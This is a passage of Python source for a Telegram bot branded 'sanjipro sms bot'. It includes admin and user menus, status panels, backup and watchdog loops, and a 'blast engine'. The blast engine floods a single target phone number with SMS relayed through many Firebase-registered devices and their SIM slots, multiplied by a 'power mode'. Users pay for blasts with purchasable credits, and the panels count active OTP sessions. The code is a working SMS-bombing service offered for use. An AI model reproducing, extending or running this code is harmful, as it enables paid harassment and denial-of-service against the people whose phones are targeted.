            btn("templates", "user:templates:menu", EMOJI_FILE, "📝", style="primary"),
            btn("buy credits", "user:pricing", EMOJI_MONEY, "💰", style="success"),
        ],
        [
            btn("transfer", "user:transfer:menu", EMOJI_MONEY, "💸", style="primary"),
            btn("gift coins", "user:gift:menu", EMOJI_COIN, "🎁", style="primary"),
        ],
        [
            btn("support", "user:support", EMOJI_BELL, "📩", style="primary"),
            btn("info", "user:info", EMOJI_GEAR, "ℹ️", style="primary"),
        ],
    ])

def wallet_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("transfer credits", "user:transfer:credits", EMOJI_MONEY, "💸", style="primary"),
            btn("transfer coins", "user:transfer:coins", EMOJI_COIN, "🪙", style="primary"),
        ],
        [
            btn("buy", "user:pricing", EMOJI_MONEY, "🛒", style="success"),
            btn("coin ledger", "user:coin_ledger", EMOJI_COIN, "📜", style="primary"),
        ],
        [btn("back", "user:home", EMOJI_GEAR, "🔙")],
    ])

# ============================================================
#  FIREBASE MENU KEYBOARD
# ============================================================
def fb_menu_kb(d, page=0):
    fbs = d.get("firebases", [])
    per = 8
    tp = max(1, (len(fbs) + per - 1) // per)
    page = max(0, min(page, tp - 1))
    start = page * per
    curr = fbs[start:start + per]
    rows = [
        [
            btn("add firebase", "owner:fb:add", EMOJI_PLUS, "➕"),
            btn("add via txt", "owner:fb:add_file", EMOJI_FILE, "📄"),
        ],
        [btn("bulk add (multi-file)", "owner:fb:add_multi", EMOJI_FILE, "📁")],
    ]
    for fb in curr:
        lbl = fb.get("label", fb["url"].replace("https://", ""))
        if len(lbl) > 16:
            lbl = lbl[:14] + ".."
        rows.append([
            btn(lbl, "noop", EMOJI_FIRE, "🔥"),
            btn("remove", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑"),
        ])
    nav = []
    if page > 0:
        nav.append(btn("prev", f"owner:fb:menu:{page - 1}", EMOJI_GEAR, "◀️"))
    if page < tp - 1:
        nav.append(btn("next", f"owner:fb:menu:{page + 1}", EMOJI_GEAR, "▶️"))
    if nav:
        rows.append(nav)
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  OWNERS / ADMINS MENU KEYBOARDS
# ============================================================
def owners_menu_kb(d):
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("add super admin", "owner:owners:add", EMOJI_PLUS, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (main)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([
                btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"),
                btn("remove", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑"),
            ])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d):
    admins = d.get("admins", [])
    rows = [[btn("add admin", "owner:admins:add", EMOJI_PLUS, "➕")]]
    for aid in admins:
        rows.append([
            btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"),
            btn("remove", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑"),
        ])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d, prefix):
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("back", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  VIDEOS MENU KEYBOARD
# ============================================================
def videos_menu_kb(d):
    vids = d.get("videos", [])
    rows = [
        [btn("add video", "owner:videos:add", EMOJI_PLUS, "➕")],
        [btn("bulk delete all", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")],
    ]
    for idx in range(len(vids)):
        rows.append([
            btn(f"Video #{idx + 1}", "noop", EMOJI_VIDEO, "📹"),
            btn("remove", f"owner:videos:del:{idx}", EMOJI_CROSS, "🗑"),
        ])
    rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  FORCE JOIN MENU KEYBOARD
# ============================================================
def fj_menu_kb(d):
    fj = d.get("force_join", {})
    chs = fj.get("channels", [])
    bypass = fj.get("bypass", [])
    st = "🟢 ON" if fj.get("enabled") else "🔴 OFF"
    rows = [
        [btn("add channel/group", "owner:fj:add", EMOJI_PLUS, "➕")],
        [btn("remove channel/group", "owner:fj:remove", EMOJI_CROSS, "🗑")],
        [btn("test / diagnose", "owner:fj:test", EMOJI_WARNING, "🧪", style="primary")],
        [btn("manage bypass", "owner:fj:bypass", EMOJI_USER, "🔓", style="primary")],
        [btn("force join stats", "owner:fj:stats", EMOJI_CHART, "📊", style="primary")],
        [InlineKeyboardButton(
            text="🟢 ENABLE" if not fj.get("enabled") else "🔴 DISABLE",
            callback_data="owner:fj:toggle",
        )],
        [btn("back", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fj_kb(missing):
    rows = []
    for ch in missing:
        label = ch.get("title", "Channel")[:20]
        rows.append([btn_url(f"join {label}", ch["link"], EMOJI_BELL, "🔔", style="success")])
    rows.append([btn("check again", "fj:check", EMOJI_GEAR, "🔄", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ============================================================
#  PANEL TEXT HELPERS
# ============================================================
def _fb_summary():
    source = FB_DEVICE_COUNTS if FB_DEVICE_COUNTS else LAST_KNOWN_FB_COUNTS
    items = list(source.items())[:5]
    lines = []
    for fb_id, fd in items:
        age = int(time.time() - fd.get("last_update", 0))
        s = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        lines.append(
            f"  {s} {esc(str(fd.get('label', 'N/A'))[:20])}: "
            f"<b>{int(fd.get('online', 0)) * CURRENT_POWER_MODE}</b> ᴀᴘɪs"
        )
    if len(source) > 5:
        lines.append(f"  {em(EMOJI_STAR, '➕')} +{len(source) - 5} more...")
    return "\n".join(lines) if lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

# ============================================================
#  OWNER PANEL TEXT
# ============================================================
def owner_panel_text(d):
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    fj = d.get("force_join", {})
    fj_s = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if fj.get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    maint = d.get("settings", {}).get("maintenance", False)
    m_s = f"{em(EMOJI_WARNING, '🔧')} ᴏɴ" if maint else f"{em(EMOJI_CHECK, '🟢')} ᴏғғ"
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    otp_active = len([s for s in OTP_LIVE_SESSIONS.values() if s.get("task") and not s["task"].done()])
    owner_disp = get_owner_display(d)
    owner_line = f"<b>Owner:</b> {esc(owner_disp)}\n" if owner_disp else ""
    total_coins = sum(int(u.get("coins", 0)) for u in users.values())
    total_credits = sum(int(u.get("credits", 0)) for u in users.values())
    gh_s = "🟢 ᴀᴄᴛɪᴠᴇ" if GITHUB_ENABLED else "🔴 ᴏғғ"
    return (
        f"╭───────────────────────╮\n"
        f"   {em(EMOJI_CROWN, '👑')} <b>{sc('sanjipro panel')}</b> • {_VERSION}\n"
        f"╰───────────────────────╯\n"
        f"{owner_line}"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴘᴏᴡᴇʀ ᴍᴏᴅᴇ    : <b>{CURRENT_POWER_MODE}x</b>\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}</b>\n"
        f"{em(EMOJI_USER, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_MONEY, '💰')} ᴛᴏᴛᴀʟ ᴄʀᴇᴅɪᴛs : <b>{total_credits}</b>\n"
        f"{em(EMOJI_COIN, '🪙')} ᴛᴏᴛᴀʟ ᴄᴏɪɴs  : <b>{total_coins}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs : <b>{active}</b>\n"
        f"{em(EMOJI_OTP, '🔐')} ᴀᴄᴛɪᴠᴇ ᴏᴛᴘ   : <b>{otp_active}</b>\n"
        f"{em(EMOJI_GIFT, '🆓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ ғᴏʀ ᴀʟʟ\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ   : {fj_s}\n"
        f"{em(EMOJI_WARNING, '🔧')} ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ  : {m_s}\n"
        f"{em(EMOJI_FILE, '📤')} ɢɪᴛʜᴜʙ sʏɴᴄ  : {gh_s}\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ    : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_PHONE, '📱')} <b>ᴘᴇʀ ғɪʀᴇʙᴀsᴇ</b>\n{_fb_summary()}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ: {get_scan_status()}\n"
        f"<i>🔄 auto-refresh every {_PANEL_REFRESH_INTERVAL:.0f}s</i>"
    )

# ============================================================
#  ADMIN PANEL TEXT
# ============================================================
def admin_panel_text(d):
    users = d.get("users", {})
    stats = d.get("stats", {})
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    return (
        f"╭───────────────────────╮\n"
        f"   {em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> • {_VERSION}\n"
        f"╰───────────────────────╯\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_USER, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴘᴏᴡᴇʀ ᴍᴏᴅᴇ    : <b>{CURRENT_POWER_MODE}x</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(d.get('banned', []))}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs : <b>{active}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_PHONE, '📱')} <b>ᴘᴇʀ ғɪʀᴇʙᴀsᴇ</b>\n{_fb_summary()}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ      : {get_scan_status()}"
    )

# ============================================================
#  USER HOME TEXT
# ============================================================
def user_home_text(uid, d):
    udata = d["users"].get(str(uid), {})
    credits = udata.get("credits", 0)
    coins = udata.get("coins", 0)
    real = len(CACHED_DEVICES)
    shown = real * CURRENT_POWER_MODE if real > 0 else LAST_KNOWN_DEVICE_COUNT
    limit = get_user_send_limit(uid, d)
    otp_limit = get_user_otp_limit(uid, d)
    if is_admin(uid, d) or is_owner(uid, d) or limit is None:
        limit_line = f"{em(EMOJI_LOCK, '🔓')} sᴍs ʟɪᴍɪᴛ : <b>ᴜɴʟɪᴍɪᴛᴇᴅ</b>"
    elif limit <= 0:
        limit_line = f"{em(EMOJI_CROSS, '🚫')} sᴍs ʟɪᴍɪᴛ : <b>BLOCKED</b>"
    else:
        limit_line = f"{em(EMOJI_LOCK, '🔒')} sᴍs ʟɪᴍɪᴛ : <b>{limit}</b>"
    if is_admin(uid, d) or is_owner(uid, d) or otp_limit is None:
        otp_line = f"{em(EMOJI_OTP, '🔐')} ᴏᴛᴘ ʟɪᴍɪᴛ : <b>ᴜɴʟɪᴍɪᴛᴇᴅ</b>"
    elif otp_limit <= 0:
        otp_line = f"{em(EMOJI_CROSS, '🚫')} ᴏᴛᴘ ʟɪᴍɪᴛ : <b>BLOCKED</b>"
    else:
        otp_line = f"{em(EMOJI_OTP, '🔐')} ᴏᴛᴘ ʟɪᴍɪᴛ : <b>{otp_limit}</b>"
    owner_disp = get_owner_display(d)
    owner_line = f"<b>Owner:</b> {esc(owner_disp)}\n" if owner_disp else ""
    otp_cost = get_otp_cost(d)
    prem = "💎 ᴘʀᴇᴍɪᴜᴍ" if is_premium(uid, d) else ""
    return (
        f"╭───────────────────────╮\n"
        f"   {em(EMOJI_ROCKET, '🚀')} <b>{sc('sanjipro sms bot')}</b>\n"
        f"        <i>{_VERSION}</i>\n"
        f"╰───────────────────────╯\n"
        f"{owner_line}"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_USER, '👤')} ʀᴏʟᴇ   : {role_tag(uid, d)} {prem}\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs: <b>{credits}</b>\n"
        f"{em(EMOJI_COIN, '🪙')} ᴄᴏɪɴs  : <b>{coins}</b>\n"
        f"{em(EMOJI_STAR, '📤')} sᴇɴᴛ   : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_OTP, '🔐')} ᴏᴛᴘ    : <b>{udata.get('otp_uses', 0)}</b> · ᴄᴏsᴛ <b>{otp_cost}</b> 🪙\n"
        f"{limit_line}\n"
        f"{otp_line}\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs   : <b>{shown}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ: {get_scan_status()}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴏʀ <b>{sc('get otp')}</b> 🚀"
    )

# ============================================================
#  PROGRESS TEXT
# ============================================================
def progress_text(sent, failed, total, credits=None, speed_label="⚡", extra=""):
    bar = progress_bar(sent + failed, total)
    pct = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('blasting sms')}</b>\n",
        f"<code>{bar}</code> <b>{pct}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ   : <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ : <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴛᴏᴛᴀʟ  : <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ  : <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs: <b>{credits}</b>")
    if extra:
        lines.append(extra)
    lines.append(f"\n<i>🛑 sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ɴᴇᴇᴄʜᴇ.</i>")
    return "\n".join(lines)

# ============================================================
#  FIREBASE HEALTH VIEW
# ============================================================
def _firebase_health_text(d):
    fbs = d.get("firebases", [])
    fh = d.get("firebase_health", {})
    if not fbs:
        return "❌ No firebases added."
    lines = [f"{em(EMOJI_CHART, '📊')} <b>Firebase Health</b>\n"]
    for fb in fbs[:20]:
        fid = fb["id"]
        h = fh.get(fid, {})
        ok = h.get("ok", 0)
        fail = h.get("fail", 0)
        last_err = h.get("last_error", "")
        st = FB_SCAN_ERRORS.get(fid, "")
        total = ok + fail
        rate = (ok / total * 100) if total else 0
        lbl = esc(fb.get("label", fb["url"][:20])[:20])
        lines.append(
            f"🔥 <b>{lbl}</b>\n"
            f"   ✅ {ok} | ❌ {fail} | 📊 {rate:.0f}%\n"
            f"   {em(EMOJI_WARNING, '⚠️')} {esc(st or last_err or 'ok')[:40]}\n"
        )
    return "\n".join(lines)

# ============================================================
#  BACKGROUND LOOPS
# ============================================================
async def backup_loop(bot):
    """Hourly data backup to log channel."""
    while True:
        try:
            await asyncio.sleep(3600)
            if not os.path.exists(_DATA_FILE):
                continue
            sz = os.path.getsize(_DATA_FILE)
            if sz > 45 * 1024 * 1024:
                continue
            cap = (
                f"📦 <b>BACKUP</b>\n\n"
                f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"📂 {round(sz / 1024, 1)} KB"
            )
            await bot.send_document(
                chat_id=LOG_CHANNEL_ID,
                document=FSInputFile(_DATA_FILE),
                caption=cap,
                parse_mode="HTML",
            )
        except asyncio.CancelledError:
            raise
        except Exception:
            await asyncio.sleep(60)

async def daily_report_loop(bot):
    """Send daily summary to owner every 24h at ~3AM."""
    while True:
        try:
            # sleep until next 3am
            now = datetime.now()
            target = now.replace(hour=3, minute=0, second=0, microsecond=0)
            if target <= now:
                target = target + timedelta(days=1)
            wait = (target - now).total_seconds()
            await asyncio.sleep(max(60, wait))

            d = load()
            if not d.get("settings", {}).get("daily_report", True):
                continue
            stats = d.get("stats", {})
            users = d.get("users", {})
            fbs = d.get("firebases", [])
            coins_t = sum(int(u.get("coins", 0)) for u in users.values())
            cred_t = sum(int(u.get("credits", 0)) for u in users.values())
            txt = (
                f"{em(EMOJI_CHART, '📊')} <b>Daily Report</b>\n\n"
                f"📅 {datetime.now().strftime('%Y-%m-%d')}\n"
                f"👥 Users: <b>{len(users)}</b>\n"
                f"🔥 Firebases: <b>{len(fbs)}</b>\n"
                f"📤 Total sent: <b>{stats.get('total_sent', 0)}</b>\n"
                f"❌ Total failed: <b>{stats.get('total_failed', 0)}</b>\n"
                f"💰 Credits held: <b>{cred_t}</b>\n"
                f"🪙 Coins held: <b>{coins_t}</b>\n"
                f"🟢 Devices: <b>{LAST_KNOWN_DEVICE_COUNT}</b>"
            )
            try:
                await bot.send_message(MAIN_OWNER, txt, parse_mode="HTML")
            except Exception:
                pass
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.warning(f"[REPORT] {e}")
            await asyncio.sleep(3600)

async def watchdog_loop(bot):
    fails = 0
    while True:
        try:
            await asyncio.sleep(_WATCHDOG_INTERVAL)
            try:
                me = await asyncio.wait_for(bot.get_me(), timeout=15)
                if me is None:
                    raise RuntimeError("get_me None")
                fails = 0
            except asyncio.TimeoutError:
                fails += 1
            except Exception:
                fails += 1
            if fails >= _WATCHDOG_MAX_FAILS:
                log.critical("[WATCHDOG] restart triggered")
                raise RuntimeError("Watchdog restart")
        except asyncio.CancelledError:
            raise
        except RuntimeError:
            raise
        except Exception:
            fails += 1
            if fails >= _WATCHDOG_MAX_FAILS:
                raise

async def heartbeat_loop():
    while True:
        try:
            _heartbeat()
            await asyncio.sleep(_HEARTBEAT_INTERVAL)
        except asyncio.CancelledError:
            raise
        except Exception:
            await asyncio.sleep(5)

async def owner_panel_refresher(bot):
    while True:
        try:
            await asyncio.sleep(_PANEL_REFRESH_INTERVAL)
            now = time.time()
            for uid, st in list(_OWNER_PANEL_STATE.items()):
                if not st.get("active"):
                    continue
                if now - st.get("last_user_action", 0) < 3:
                    continue
                try:
                    d = load()
                    if not is_owner(uid, d):
                        _OWNER_PANEL_STATE.pop(uid, None)
                        continue
                    await bot.edit_message_text(
                        text=owner_panel_text(d),
                        chat_id=st["chat_id"],
                        message_id=st["msg_id"],
                        reply_markup=owner_kb(d),
                        parse_mode="HTML",
                    )
                except TelegramRetryAfter as e:
                    await asyncio.sleep(min(e.retry_after, 30))
                except TelegramBadRequest:
                    pass
                except Exception:
                    pass
        except asyncio.CancelledError:
            raise
        except Exception:
            pass

async def supervised(name, func, bot):
    backoff = 5
    while True:
        try:
            log.info(f"[SUP] starting {name}")
            await func(bot)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.error(f"[SUP] {name} crashed: {e}", exc_info=True)
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        else:
            await asyncio.sleep(5)

# ============================================================
#  BLAST ENGINE
# ============================================================
async def blast(bot, msg, uid, number, message, count, devices, speed=SPEED_DEFAULT):
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} No APIs online!", parse_mode="HTML")
        return
    pm = CURRENT_POWER_MODE
    cap = len(devices) * pm
    if count > cap:
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Max <b>{cap}</b>. Auto-adjust.", parse_mode="HTML")
        count = cap
    if count <= 0:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid count.", parse_mode="HTML")
        return
    async with GLOBAL_BLAST_SEM:
        await _run_blast(bot, msg, uid, number, message, count, devices, speed, pm)

async def _run_blast(bot, msg, uid, number, message, count, devices, speed, pm):
    # Optional video announcement disabled: send_video() was undefined.
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old = USER_SESSIONS[uid]
            if old.task and not old.task.done():
                await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Blast already running!", parse_mode="HTML")
                return
            del USER_SESSIONS[uid]
        session = UserSession(uid)
        session.number = number
        session.blast_data = load()
        USER_SESSIONS[uid] = session
    is_regular = not is_admin(uid, load()) and not is_owner(uid, load())
    init_credits = get_user_credits(uid, load()) if is_regular else None
    slabel = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"
    try:
        pmsg = await msg.answer(
            progress_text(0, 0, count, init_credits, slabel),
            reply_markup=stop_kb(),
            parse_mode="HTML",
        )
    except Exception:
        async with SESSIONS_LOCK:
            USER_SESSIONS.pop(uid, None)
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_delta = {}
    last_upd = time.time()
    start = time.time()
    edit_lock = asyncio.Lock()
    sem = asyncio.Semaphore(min(len(devices), _SEND_CONCURRENCY))

    async def upd_progress(force=False):
        nonlocal last_upd
        async with edit_lock:
            now = time.time()
            if not force and now - last_upd < _PROGRESS_UPDATE_INTERVAL:
                return
            last_upd = now
            try:
                live = get_user_credits(uid, load()) if is_regular else None
                await pmsg.edit_text(
                    progress_text(sent_ok, sent_fail, count, live, slabel),
                    reply_markup=stop_kb() if not session.cancelled else None,
                    parse_mode="HTML",
                )
            except TelegramRetryAfter as e:
                await asyncio.sleep(e.retry_after + 1)
            except Exception:
                pass

    async def send_one(device, pass_num):
        nonlocal sent_ok, sent_fail, msgs_left
        async with sem:
            async with session.lock:
                if session.cancelled or msgs_left <= 0:
                    return
                msgs_left -= 1
            fb_id = device["fb_id"]
            fb_url = device["fb_url"]
            dev_id = device["dev_id"]
            sims = device.get("sims", [])
            sim_slots = []
            if isinstance(sims, list):
                for s in sims:
                    if isinstance(s, dict):
                        try:
                            sim_slots.append(int(s.get("simSlotIndex", 0)))
                        except Exception:
                            sim_slots.append(0)
            if isinstance(sims, dict):
                for s in sims.values():
                    if isinstance(s, dict):
                        try:
                            sim_slots.append(int(s.get("simSlotIndex", 0)))
                        except Exception:
                            sim_slots.append(0)
            if not sim_slots:
                sim_slots = [0]
            sim = sim_slots[pass_num % len(sim_slots)]
            ok = False
            try:
                ok = await sms_via_device(fb_url, dev_id, sim, number, message)
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            async with session.lock:
                if ok:
                    sent_ok += 1
                    if is_regular:
                        deduct_credits(uid, 1, session.blast_data, "blast")
                        session.blast_data["stats"]["total_sent"] = session.blast_data["stats"].get("total_sent", 0) + 1
                        k = str(uid)
                        if k in session.blast_data["users"]:
                            session.blast_data["users"][k]["uses"] = session.blast_data["users"][k].get("uses", 0) + 1
                        session.blast_data.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                            "number": number,
                            "message": str(message)[:100],
                            "timestamp": now_ts(),
                            "status": "sent",
                        })
                else:
                    sent_fail += 1
                if fb_id not in api_delta:
                    api_delta[fb_id] = {"sent": 0, "failed": 0}
                api_delta[fb_id]["sent" if ok else "failed"] += 1
            await upd_progress()

    async def do_send():
        try:
            for pass_num in range(pm):
                if msgs_left <= 0:
                    break
                async with session.lock:
                    if session.cancelled:
                        break
                tasks = []
                for device in devices:
                    async with session.lock:
                        if msgs_left <= 0 or session.cancelled:
                            break
                    tasks.append(send_one(device, pass_num))
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                if speed > 0:
                    await asyncio.sleep(speed)
        except asyncio.CancelledError:
            raise
        except Exception as e:
            log.error(f"[LOOP] uid={uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    try:
        await task
    except asyncio.CancelledError:
        session.cancelled = True
    except Exception:
        pass
    finally:
        try:
            if not is_regular:
                df = session.blast_data if session.blast_data else load()
                df["stats"]["total_sent"] = df["stats"].get("total_sent", 0) + sent_ok
                df["stats"]["total_failed"] = df["stats"].get("total_failed", 0) + sent_fail
                for fid, dl in api_delta.items():
                    df["stats"].setdefault("api_usage", {}).setdefault(fid, {"sent": 0, "failed": 0})
                    df["stats"]["api_usage"][fid]["sent"] += dl["sent"]
                    df["stats"]["api_usage"][fid]["failed"] += dl["failed"]
                k = str(uid)
                if k in df["users"]:
                    df["users"][k]["uses"] = df["users"][k].get("uses", 0) + sent_ok
                df.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                    "number": number,
                    "message": str(message)[:100],
                    "timestamp": now_ts(),
                    "status": "completed" if not session.cancelled else "stopped",
                })
                save(df)
            else:
                df = session.blast_data if session.blast_data else load()
                df["stats"]["total_failed"] = df["stats"].get("total_failed", 0) + sent_fail
                for fid, dl in api_delta.items():
                    df["stats"].setdefault("api_usage", {}).setdefault(fid, {"sent": 0, "failed": 0})
                    df["stats"]["api_usage"][fid]["failed"] += dl["failed"]
                save(df)
        except Exception:
            pass
        finally:
            async with SESSIONS_LOCK:
                USER_SESSIONS.pop(uid, None)

    was_cancel = session.cancelled
    await upd_progress(force=True)
    dur = max(1, int(time.time() - start))
    rate = sent_ok / dur
    log_activity(load(), "sms_blast", uid, f"sent={sent_ok} failed={sent_fail}")

    try:
        ci = await bot.get_chat(uid)
        u_name = ci.full_name or "Unknown"
        u_uname = f"@{ci.username}" if ci.username else "None"
    except Exception:
        u_name = load().get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "None"

    _spawn(send_log(bot, (
        f"🚀 <b>SMS BLAST</b>\n\n"
        f"👤 {esc(u_name)}\n🆔 <code>{uid}</code>\n🌐 {esc(u_uname)}\n"
        f"📞 <code>{esc(number)}</code>\n"
        f"💬 <code>{esc(str(message)[:100])}</code>\n"
        f"✅ {sent_ok} | ❌ {sent_fail} | 📊 {count}\n"
        f"🔢 {pm}x | ⚡ {rate:.1f}/s | ⏱ {fmt_duration(dur)}\n"
        f"🛑 {'STOPPED' if was_cancel else 'COMPLETED'}"
    )))

    icon = (
        em(EMOJI_CHECK, "✅") if sent_fail == 0 and sent_ok > 0
        else em(EMOJI_WARNING, "⚠️") if sent_ok > 0
        else em(EMOJI_CROSS, "❌")
    )
    ctxt = ""
    if is_regular:
        ctxt = f"\n💰 Used: <b>{sent_ok}</b> | Left: <b>{get_user_credits(uid, load())}</b>"
    stxt = f"\n🛑 <b>Stopped!</b>" if was_cancel else ""

    if is_owner(uid, load()):
        back = [btn("owner panel", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    elif is_admin(uid, load()):
        back = [btn("admin panel", "admin:home", EMOJI_GEAR, "🔙", style="primary")]
    else:
        back = [
            btn("send another", "user:send", EMOJI_ROCKET, "📤", style="success"),
            btn("home", "user:home", EMOJI_ROCKET, "🏠", style="primary"),
        ]

    try:
        await pmsg.edit_text(
            f"{icon} <b>Blast Result</b>{stxt}\n\n"
            f"📞 <code>{esc(mask_number(number))}</code>\n"
            f"💬 <code>{esc(str(message)[:50])}</code>\n"
            f"✅ Sent: <b>{sent_ok}</b>\n"
            f"❌ Failed: <b>{sent_fail}</b>\n"
            f"🔢 Power: <b>{pm}x</b>\n"
            f"⚡ Rate: <b>{rate:.1f}/s</b>\n"
            f"⏱ {fmt_duration(dur)}{ctxt}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back]),
            parse_mode="HTML",
        )
    except Exception:
        pass

# ============================================================
#  SCHEDULED BLASTS TICKER
# ============================================================
async def scheduler_loop(bot):
    while True:
        try:
            await asyncio.sleep(_SCHED_TICK)
            now = now_ts()
            d = load()
            scheds = d.get("scheduled", [])
            if not scheds:
                continue
            remaining = []
            for item in scheds:
                try:
